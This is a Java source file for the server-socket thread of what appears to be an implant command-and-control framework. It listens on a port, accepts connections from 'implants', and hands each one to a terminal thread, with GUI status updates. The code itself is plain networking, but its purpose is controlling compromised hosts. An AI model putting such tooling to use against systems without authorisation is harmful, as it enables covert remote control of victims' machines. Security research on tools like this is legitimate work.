/**
 * This is the main ServerSocket thread listening for new connections.  Each connection will be thrown into a new terminal thread
 * 
 *  @author Solomon Sonya
 */

package Controller.Thread;

import Controller.GUI.*;
import Controller.Drivers.Drivers;
import Implant.Driver;

import java.io.*;
import javax.crypto.*;
import java.net.*;
import java.security.*;
import java.util.*;

import javax.swing.*;
import java.awt.*;

public class Thread_ServerSocket extends Thread implements Runnable
{
	String strMyClassName = this.getName();
	
	public static int svrSocketPort = -1;
	static public InetAddress localhost = null;
	static public ServerSocket svrSocket = null;
	static public String serverAddr ="";
	static public InetAddress bindAddress = null;
	
	public  Thread_Terminal terminal = null;
	
	public static String ControllerIP = ""; 
		
	static public boolean serverSocketRunning = false; 
	
	
	
	static JLabel jlblStatusLabel = null, jlblEstablishedPortNum = null, jlblNumConnectedImplants, jlblServerIP = null;
	
	public static volatile boolean keepServerSocketOpen = true;
	
	public Thread_ServerSocket(int port, InetAddress bind_IP_Address, JLabel statusLabel, JLabel establishedPort, JLabel connectedImplants, JLabel lhost)
	{
		try
		{
			//set variables here
			jlblStatusLabel = statusLabel;
			jlblEstablishedPortNum = establishedPort;
			svrSocketPort = port;
			jlblNumConnectedImplants = connectedImplants;
			jlblServerIP = lhost;
			bindAddress = bind_IP_Address;
		}
		catch(Exception e)
		{
			Drivers.eop("Thread_ServerSocket Constructor", strMyClassName, e, "", false);
		}
		
	}
	
	public void run()
	{
		boolean establishSocket = true;
		//ensure variables are set
		if(jlblStatusLabel == null)
		{
			Drivers.jop_Error("Unable to start ServerSocket.  Status Label is not set", "Can not Start ServerSocket");
			establishSocket = false;
		}
		
		if(jlblEstablishedPortNum == null)
		{
			Drivers.jop_Error("Unable to start ServerSocket.  Status Port Number is not set", "Can not Start ServerSocket");
			establishSocket = false;
		}
		
		if(svrSocketPort < 1 || svrSocketPort > 65534)
		{
			Drivers.jop_Error("Unable to start ServerSocket.  Socket Port is out of range", "Can not Start ServerSocket");
			establishSocket = false;
		}
		
		if(jlblNumConnectedImplants == null)
		{
			Drivers.jop_Error("Unable to start ServerSocket.  Status Implant Label is not set", "Can not Start ServerSocket");
			establishSocket = false;
		}			
		
		if(jlblServerIP == null)
		{
			Drivers.jop_Error("Unable to start ServerSocket.  Server IP Label is not set", "Can not Start ServerSocket");
			establishSocket = false;
		}
		
		
		//all vars set, establish the server socket
		if(establishSocket)
		{
			Drivers.indicateServerSocketStatus_Closed();
			
			establishServerSocket(svrSocketPort, bindAddress);					
		}
		else
		{
			Drivers.sop("Unable to start ServerSocket. Error was displayed to user");
		}
		
		/*******************************************
		 * 
		 * INFINITE WHILE FOR NEW CONNECTIONS!
		 * 
		 ******************************************/
		while(keepServerSocketOpen)
		{
			Socket sckClientSocket = null;
			try
			{
				//forever wait until a new connection is established, once a new connection is received, spawn a new 
				sckClientSocket = svrSocket.accept();
				
				//we just got here, new socket is established. bind socket to new thread to correspond to implant
				Thread_Terminal terminal = new Thread_Terminal(false, false, false, sckClientSocket);//it is unknown at this time the type of implant connected, thus, say all are false
				terminal.start();				
				
				//"link" the thread to the arraylist
				/*Drivers.alTerminals.add(terminal);
												
				//update number connected agents
				Drivers.updateConnectedImplants();
				Drivers.jtblConnectedImplants.updateJTable = true;*/
				
				//that is all, loop back to the top to wait to accept the next connection
			}
						
			
			catch(SocketException se)
			{
				Drivers.sop("ServerSocket is closed. I am terminaing waiting for connections.  Please re-establish ServerSocket if necessary");
				keepServerSocketOpen = false;
				break;
			}
			
			
			catch(Exception e)
			{
				Drivers.eop("ServerSocket thead run", strMyClassName, e, "Not a problem. Perhaps remote agent disconnected. Please re-establish the server socket if necessary", false);
				//keepServerSocketOpen = false;
			}
			
			//We break out when the server socket is no longer running. indicate accordingly
			/*this.jlblEstablishedPortNum.setText("CLOSED");
			this.jlblServerIP.setText("OFFLINE");
			this.jlblStatusLabel.setText("OFFLINE");*/
		}
		
		Drivers.indicateServerSocketStatus_Closed();
	}
	
	public boolean establishServerSocket(int prt, InetAddress bind_IP_Addr)
	{
		try
		{
			serverSocketRunning = false;
			keepServerSocketOpen = false;
			
			//Establish ServerSocket and bind to Port
			try
			{
				if(bind_IP_Addr == null)
				{
					Driver.sop("Bind IP Address not specified, attempting to establish serversocket on default interface...");
					svrSocket = new ServerSocket(prt);
				}
				else
				{
					svrSocket = new ServerSocket(prt, 0, bind_IP_Addr);
				}
			}
			catch(SocketException se)
			{
				Drivers.jop_Error("ServerSocket is unable to bind to port " + prt + ".\nPerhaps this port is occupied.                                   \n\nPlease try a different port", "ServerSocket NOT ESTABLISHED - Unable to bind to port" + prt);
				Drivers.sop("Unable to bind to port " + prt + ". ServerSocket is Closed. You must try another port in order to continue");
				return false;
			}
			
			//Set the IP address
			//localhost = InetAddress.getLocalHost();
			localhost = svrSocket.getInetAddress();
			
			this.jlblEstablishedPortNum.setText("" + prt);
			this.jlblStatusLabel.setText("RUNNING");
			this.jlblServerIP.setText(localhost.getHostAddress());
			ControllerIP = localhost.getHostAddress();
			
			String success = 	" * * * * * ServerSocket Established at " +Drivers.getTimeStamp_Without_Date() + " * * * * *\n" + 
								"Server HostName: " + localhost.getHostName() + "\n" + 
								"Server IP: " + localhost.getHostAddress() + "\n" + 
								"Listening for Implants on Port: " + prt;
			
			Drivers.sop("");
			Drivers.sop(success);
			
			keepServerSocketOpen = true;
			
			jlblStatusLabel.setBackground(Color.green.darker());
			
			Drivers.jop_Warning(success, "ServerSocket Established");
			
			
			
			serverSocketRunning = true;
			
			/**
			 * solo, think of resolving external ip using the following code: //add button
			 * 
			 * URL myIP = new URL("http://checkip.amazonaws.com");
			 * BufferedReader brURL = new BufferedReader(new InputStreamReam(myIP.openStream()));
			 * String line = brURL.readLine();
			 * brURL.close(); 
			 * 
			 */
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("establishServerSocket", strMyClassName, e, "Unable to maintain established server socket", false);
		}
		
		return false;
	}
	
}
